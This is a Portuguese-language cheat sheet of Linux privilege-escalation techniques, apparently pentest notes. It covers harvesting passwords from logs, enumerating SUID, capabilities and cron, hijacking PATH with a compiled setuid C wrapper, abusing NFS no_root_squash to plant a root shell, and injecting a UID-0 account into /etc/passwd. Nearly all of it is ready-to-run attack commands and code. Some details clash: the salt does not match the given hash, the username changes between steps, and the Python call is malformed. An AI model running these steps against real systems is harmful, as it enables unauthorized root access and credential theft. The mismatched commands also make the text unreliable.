### Identificação de permissões sudo
`sudo -l`
### Buscando senhas no log:
`grep -Ri password /var/log 2>/dev/null`
### Identificação de permissões SUID
`find / -perm -u=s -type f 2>/dev/null`
### Identificação de permissões Capabilities
`getcap -r / 2>/dev/null`
### Identificação de scripts programados (Cron Jobs)
`cat /etc/crontab`
Caso um script não possua o caminho absoluto definido no `/etc/crontab`, o cron irá buscar o arquivo nos diretórios definidos no PATH.
Lembre-se de dar a permissão de execução ao script.
### Manipulando a variável PATH
Identificando diretórios com permissão de gravação:
`find / -writable 2>/dev/null`
`find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u`
Adicionando a pasta `/tmp` ao PATH:
`export PATH=/tmp:$PATH`
Criando um binário com o script que irá executar um comando:
```
#include<unistd.h>
void main()
{ setuid(0);
  setgid(0);
  system("cmd");
}
```
Para compilar o código acima utilize o compilador GCC:
`gcc binario.c -o binario -w`
Altere as permissões do binário para SUID:
`chmod u+s binario`
Agora criamos o comando que será executado:
`echo "/bin/bash" > cmd`
Alteramos a permissão do comando criado:
`chmod 777 cmd`
E executamos o binário com o script que irá chamar o comando.
Lembre-se de que os arquivos devem estar em um local com permissão de escrita, além do diretório estar declarado na variável PATH.
### Explorando serviços de compartilhamento de arquivos (NFS)
Na máquina alvo, verifique se existe diretórios compartilhados com a permissão no_root_squash:
`cat /etc/exports`
Na máquina atacante, verifique quais diretórios estão permitidos realizar a montagem:
`showmount -e IP`
Crie uma pasta na máquina atacante e faça a montagem do diretório remoto no diretório criado:
`sudo mount -o rw IP:/shared/remote/folder /local/folder`
Na pasta local, crie um script que irá executar a shell:
```
#include<unistd.h>
void main()
{ setuid(0);
  setgid(0);
  system("/bin/bash");
  return 0;
}
```
Compile o script utilizando o GCC:
`sudo gcc root.c -o root -static`
Altere as permissões do binário criado para SUID:
`sudo chmod +s root`
Execute na máquina remota para escalar privilégio.

### Adicionando um usuário com privilégio root

Criar o hash da senha que será utilizada:
`openssl passwd -1 -salt HACK senha123`

Adicione as informações do usuário no arquivo `/etc/passwd`:
`hacker3:\$1\$lord\$jZwvvuLH/snkFA6S/AJA6.:0:0:root:/root:/bin/bash`

Agora é só trocar para o usuário criado:
`su hacker`

`python -c 'import crypt; print(crypt.crypt(senha123, "$6$lord"))'`
`

`\$1\$lord\$jZwvvuLH\/snkFA6S\/AJA6\.`